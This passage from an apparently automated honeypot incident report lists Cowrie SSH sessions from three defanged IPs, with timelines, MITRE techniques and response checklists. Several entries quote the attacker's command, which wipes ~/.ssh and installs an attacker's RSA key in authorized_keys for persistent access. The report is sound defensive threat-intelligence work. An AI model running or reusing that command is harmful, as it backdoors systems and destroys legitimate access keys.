| `2026-06-09 16:48:18` | `cowrie.command.failed` |
| `2026-06-09 16:48:18` | `cowrie.log.closed` |
| `2026-06-09 16:48:18` | `cowrie.session.params` |
| `2026-06-09 16:48:18` | `cowrie.command.input` |
| `2026-06-09 16:48:19` | `cowrie.session.file_download` |
| `2026-06-09 16:48:19` | `cowrie.log.closed` |
| `2026-06-09 16:48:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.78[.]49` to AbuseIPDB if not already reported
- [ ] Block `103.67.78[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4df819da309

| Field | Detail |
|---|---|
| **Source IP** | `103.67.78[.]49` |
| **First Seen** | 2026-06-09 16:48 |
| **Last Seen** | 2026-06-09 16:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 16:48:21` | `cowrie.session.connect` |
| `2026-06-09 16:48:21` | `cowrie.client.version` |
| `2026-06-09 16:48:21` | `cowrie.client.kex` |
| `2026-06-09 16:48:22` | `cowrie.login.success` |
| `2026-06-09 16:48:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.78[.]49` to AbuseIPDB if not already reported
- [ ] Block `103.67.78[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c933e70d0d6

| Field | Detail |
|---|---|
| **Source IP** | `172.172.196[.]177` |
| **First Seen** | 2026-06-09 16:49 |
| **Last Seen** | 2026-06-09 16:50 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 16:49:53` | `cowrie.session.connect` |
| `2026-06-09 16:49:53` | `cowrie.client.version` |
| `2026-06-09 16:49:54` | `cowrie.client.kex` |
| `2026-06-09 16:49:54` | `cowrie.login.success` |
| `2026-06-09 16:49:55` | `cowrie.session.params` |
| `2026-06-09 16:49:55` | `cowrie.command.input` |
| `2026-06-09 16:49:55` | `cowrie.command.failed` |
| `2026-06-09 16:49:55` | `cowrie.log.closed` |
| `2026-06-09 16:49:56` | `cowrie.session.params` |
| `2026-06-09 16:49:56` | `cowrie.command.input` |
| `2026-06-09 16:49:56` | `cowrie.session.file_download` |
| `2026-06-09 16:49:56` | `cowrie.log.closed` |
| `2026-06-09 16:50:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.196[.]177` to AbuseIPDB if not already reported
- [ ] Block `172.172.196[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3255efb78b72

| Field | Detail |
|---|---|
| **Source IP** | `172.172.196[.]177` |
| **First Seen** | 2026-06-09 16:49 |
| **Last Seen** | 2026-06-09 16:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 16:49:58` | `cowrie.session.connect` |
| `2026-06-09 16:49:58` | `cowrie.client.version` |
| `2026-06-09 16:49:59` | `cowrie.client.kex` |
| `2026-06-09 16:49:59` | `cowrie.login.success` |
| `2026-06-09 16:50:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.196[.]177` to AbuseIPDB if not already reported
- [ ] Block `172.172.196[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-729a84a09603

| Field | Detail |
|---|---|
| **Source IP** | `154.70.102[.]114` |
| **First Seen** | 2026-06-09 16:50 |
| **Last Seen** | 2026-06-09 16:50 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 16:50:26` | `cowrie.session.connect` |
| `2026-06-09 16:50:26` | `cowrie.client.version` |
| `2026-06-09 16:50:26` | `cowrie.client.kex` |
| `2026-06-09 16:50:27` | `cowrie.login.success` |
| `2026-06-09 16:50:28` | `cowrie.session.params` |
| `2026-06-09 16:50:28` | `cowrie.command.input` |
| `2026-06-09 16:50:28` | `cowrie.command.failed` |
| `2026-06-09 16:50:28` | `cowrie.log.closed` |
| `2026-06-09 16:50:29` | `cowrie.session.params` |
| `2026-06-09 16:50:29` | `cowrie.command.input` |
| `2026-06-09 16:50:29` | `cowrie.session.file_download` |
| `2026-06-09 16:50:29` | `cowrie.log.closed` |
| `2026-06-09 16:50:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.70.102[.]114` to AbuseIPDB if not already reported
- [ ] Block `154.70.102[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c32324322e45

| Field | Detail |
|---|---|
| **Source IP** | `154.70.102[.]114` |
| **First Seen** | 2026-06-09 16:50 |
| **Last Seen** | 2026-06-09 16:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 16:50:32` | `cowrie.session.connect` |
| `2026-06-09 16:50:32` | `cowrie.client.version` |
| `2026-06-09 16:50:33` | `cowrie.client.kex` |
| `2026-06-09 16:50:34` | `cowrie.login.success` |
| `2026-06-09 16:50:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.70.102[.]114` to AbuseIPDB if not already reported
- [ ] Block `154.70.102[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57ef2e2268bb

| Field | Detail |
|---|---|
| **Source IP** | `103.67.78[.]49` |
| **First Seen** | 2026-06-09 16:50 |
| **Last Seen** | 2026-06-09 16:50 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 16:50:40` | `cowrie.session.connect` |
| `2026-06-09 16:50:40` | `cowrie.client.version` |
| `2026-06-09 16:50:40` | `cowrie.client.kex` |
| `2026-06-09 16:50:41` | `cowrie.login.success` |
| `2026-06-09 16:50:41` | `cowrie.session.params` |
| `2026-06-09 16:50:41` | `cowrie.command.input` |
| `2026-06-09 16:50:41` | `cowrie.command.failed` |
| `2026-06-09 16:50:42` | `cowrie.log.closed` |
| `2026-06-09 16:50:42` | `cowrie.session.params` |
| `2026-06-09 16:50:42` | `cowrie.command.input` |
| `2026-06-09 16:50:42` | `cowrie.session.file_download` |
| `2026-06-09 16:50:42` | `cowrie.log.closed` |
| `2026-06-09 16:50:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.78[.]49` to AbuseIPDB if not already reported
- [ ] Block `103.67.78[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-682ac1f91435

| Field | Detail |
|---|---|
| **Source IP** | `103.67.78[.]49` |
| **First Seen** | 2026-06-09 16:50 |
| **Last Seen** | 2026-06-09 16:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 16:50:45` | `cowrie.session.connect` |
| `2026-06-09 16:50:45` | `cowrie.client.version` |
| `2026-06-09 16:50:45` | `cowrie.client.kex` |
| `2026-06-09 16:50:46` | `cowrie.login.success` |
| `2026-06-09 16:50:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.78[.]49` to AbuseIPDB if not already reported
- [ ] Block `103.67.78[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-253c00e80318

| Field | Detail |
|---|---|
| **Source IP** | `154.70.102[.]114` |
| **First Seen** | 2026-06-09 16:51 |
| **Last Seen** | 2026-06-09 16:51 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 16:51:15` | `cowrie.session.connect` |
| `2026-06-09 16:51:15` | `cowrie.client.version` |
| `2026-06-09 16:51:16` | `cowrie.client.kex` |
| `2026-06-09 16:51:17` | `cowrie.login.success` |
| `2026-06-09 16:51:17` | `cowrie.session.params` |
| `2026-06-09 16:51:17` | `cowrie.command.input` |
| `2026-06-09 16:51:17` | `cowrie.command.failed` |
| `2026-06-09 16:51:18` | `cowrie.log.closed` |
| `2026-06-09 16:51:18` | `cowrie.session.params` |
| `2026-06-09 16:51:18` | `cowrie.command.input` |
| `2026-06-09 16:51:18` | `cowrie.session.file_download` |
| `2026-06-09 16:51:18` | `cowrie.log.closed` |
| `2026-06-09 16:51:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.70.102[.]114` to AbuseIPDB if not already reported
- [ ] Block `154.70.102[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-733ddf4f2be2

| Field | Detail |
|---|---|
| **Source IP** | `154.70.102[.]114` |
| **First Seen** | 2026-06-09 16:51 |
| **Last Seen** | 2026-06-09 16:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 16:51:21` | `cowrie.session.connect` |
| `2026-06-09 16:51:21` | `cowrie.client.version` |
| `2026-06-09 16:51:22` | `cowrie.client.kex` |
| `2026-06-09 16:51:23` | `cowrie.login.success` |
| `2026-06-09 16:51:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.70.102[.]114` to AbuseIPDB if not already reported
- [ ] Block `154.70.102[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1885fdebbc5

| Field | Detail |
|---|---|
| **Source IP** | `103.67.78[.]49` |
| **First Seen** | 2026-06-09 16:51 |
| **Last Seen** | 2026-06-09 16:51 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 16:51:53` | `cowrie.session.connect` |
| `2026-06-09 16:51:53` | `cowrie.client.version` |
| `2026-06-09 16:51:53` | `cowrie.client.kex` |
| `2026-06-09 16:51:54` | `cowrie.login.success` |
| `2026-06-09 16:51:55` | `cowrie.session.params` |
| `2026-06-09 16:51:55` | `cowrie.command.input` |
| `2026-06-09 16:51:55` | `cowrie.command.failed` |
| `2026-06-09 16:51:55` | `cowrie.log.closed` |
| `2026-06-09 16:51:55` | `cowrie.session.params` |
| `2026-06-09 16:51:55` | `cowrie.command.input` |
| `2026-06-09 16:51:55` | `cowrie.session.file_download` |
| `2026-06-09 16:51:55` | `cowrie.log.closed` |
| `2026-06-09 16:51:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.78[.]49` to AbuseIPDB if not already reported
- [ ] Block `103.67.78[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-872faa02f7d9

| Field | Detail |
|---|---|
| **Source IP** | `172.172.196[.]177` |
| **First Seen** | 2026-06-09 16:51 |
| **Last Seen** | 2026-06-09 16:52 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 16:51:54` | `cowrie.session.connect` |
| `2026-06-09 16:51:54` | `cowrie.client.version` |
| `2026-06-09 16:51:54` | `cowrie.client.kex` |
| `2026-06-09 16:51:55` | `cowrie.login.success` |
| `2026-06-09 16:51:55` | `cowrie.session.params` |
| `2026-06-09 16:51:55` | `cowrie.command.input` |
| `2026-06-09 16:51:55` | `cowrie.command.failed` |
| `2026-06-09 16:51:56` | `cowrie.log.closed` |
| `2026-06-09 16:51:56` | `cowrie.session.params` |
| `2026-06-09 16:51:56` | `cowrie.command.input` |
| `2026-06-09 16:51:56` | `cowrie.session.file_download` |
| `2026-06-09 16:51:56` | `cowrie.log.closed` |
| `2026-06-09 16:52:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.196[.]177` to AbuseIPDB if not already reported
- [ ] Block `172.172.196[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d7b2ada1f88

| Field | Detail |
|---|---|
| **Source IP** | `103.67.78[.]49` |
| **First Seen** | 2026-06-09 16:51 |
| **Last Seen** | 2026-06-09 16:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 16:51:58` | `cowrie.session.connect` |
| `2026-06-09 16:51:58` | `cowrie.client.version` |
| `2026-06-09 16:51:58` | `cowrie.client.kex` |
| `2026-06-09 16:51:59` | `cowrie.login.success` |
| `2026-06-09 16:51:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.78[.]49` to AbuseIPDB if not already reported
- [ ] Block `103.67.78[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9834a2039751

| Field | Detail |
|---|---|
| **Source IP** | `172.172.196[.]177` |
| **First Seen** | 2026-06-09 16:51 |
| **Last Seen** | 2026-06-09 16:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 16:51:59` | `cowrie.session.connect` |
| `2026-06-09 16:51:59` | `cowrie.client.version` |
| `2026-06-09 16:51:59` | `cowrie.client.kex` |
| `2026-06-09 16:52:00` | `cowrie.login.success` |
| `2026-06-09 16:52:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.196[.]177` to AbuseIPDB if not already reported
- [ ] Block `172.172.196[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af3a91377ba0

| Field | Detail |
|---|---|
| **Source IP** | `154.70.102[.]114` |
| **First Seen** | 2026-06-09 16:52 |
| **Last Seen** | 2026-06-09 16:52 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 16:52:11` | `cowrie.session.connect` |
| `2026-06-09 16:52:11` | `cowrie.client.version` |
| `2026-06-09 16:52:11` | `cowrie.client.kex` |
| `2026-06-09 16:52:13` | `cowrie.login.success` |
| `2026-06-09 16:52:13` | `cowrie.session.params` |
| `2026-06-09 16:52:13` | `cowrie.command.input` |
| `2026-06-09 16:52:13` | `cowrie.command.failed` |
| `2026-06-09 16:52:13` | `cowrie.log.closed` |
| `2026-06-09 16:52:14` | `cowrie.session.params` |
| `2026-06-09 16:52:14` | `cowrie.command.input` |
| `2026-06-09 16:52:14` | `cowrie.session.file_download` |
| `2026-06-09 16:52:14` | `cowrie.log.closed` |
| `2026-06-09 16:52:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.70.102[.]114` to AbuseIPDB if not already reported
- [ ] Block `154.70.102[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4101ebbb3b8

| Field | Detail |
|---|---|
| **Source IP** | `103.67.78[.]49` |
| **First Seen** | 2026-06-09 16:52 |
| **Last Seen** | 2026-06-09 16:52 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 16:52:14` | `cowrie.session.connect` |
| `2026-06-09 16:52:14` | `cowrie.client.version` |
| `2026-06-09 16:52:14` | `cowrie.client.kex` |
| `2026-06-09 16:52:15` | `cowrie.login.success` |
| `2026-06-09 16:52:15` | `cowrie.session.params` |
| `2026-06-09 16:52:15` | `cowrie.command.input` |
| `2026-06-09 16:52:15` | `cowrie.command.failed` |
| `2026-06-09 16:52:15` | `cowrie.log.closed` |
| `2026-06-09 16:52:16` | `cowrie.session.params` |
| `2026-06-09 16:52:16` | `cowrie.command.input` |
| `2026-06-09 16:52:16` | `cowrie.session.file_download` |
| `2026-06-09 16:52:16` | `cowrie.log.closed` |
| `2026-06-09 16:52:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.78[.]49` to AbuseIPDB if not already reported
- [ ] Block `103.67.78[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fa9f62d5bcc

| Field | Detail |
|---|---|
| **Source IP** | `154.70.102[.]114` |
| **First Seen** | 2026-06-09 16:52 |
| **Last Seen** | 2026-06-09 16:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 16:52:17` | `cowrie.session.connect` |
| `2026-06-09 16:52:17` | `cowrie.client.version` |
| `2026-06-09 16:52:18` | `cowrie.client.kex` |
| `2026-06-09 16:52:19` | `cowrie.login.success` |
| `2026-06-09 16:52:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.70.102[.]114` to AbuseIPDB if not already reported
- [ ] Block `154.70.102[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f6d3697609d

| Field | Detail |
|---|---|
| **Source IP** | `103.67.78[.]49` |
| **First Seen** | 2026-06-09 16:52 |
| **Last Seen** | 2026-06-09 16:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 16:52:18` | `cowrie.session.connect` |
| `2026-06-09 16:52:18` | `cowrie.client.version` |
| `2026-06-09 16:52:19` | `cowrie.client.kex` |
| `2026-06-09 16:52:20` | `cowrie.login.success` |
| `2026-06-09 16:52:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.78[.]49` to AbuseIPDB if not already reported
- [ ] Block `103.67.78[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b0997d35b13

| Field | Detail |
